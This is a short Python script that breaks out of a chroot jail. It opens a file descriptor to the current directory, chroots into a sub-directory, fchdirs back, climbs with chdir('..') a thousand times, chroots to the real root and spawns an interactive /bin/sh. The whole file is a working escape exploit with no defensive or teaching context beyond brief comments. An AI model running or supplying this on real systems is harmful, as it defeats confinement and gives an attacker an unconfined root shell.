import os
from subprocess import call

os.seteuid(0) #instead of os.setuid(0)
try:
    os.mkdir('./subchroot_1')
except:
    pass
fd_we_need = os.open('.', os.O_RDONLY)
os.chroot('./subchroot_1')  # chrooting to subchroot directory
os.fchdir(fd_we_need) #Change our working directory using fd
os.close(fd_we_need)
for x in range(0, 1000): #Same as the for loop in C
    os.chdir("..")
os.chroot(".")
call(["/bin/sh","-i"]) #Open our shell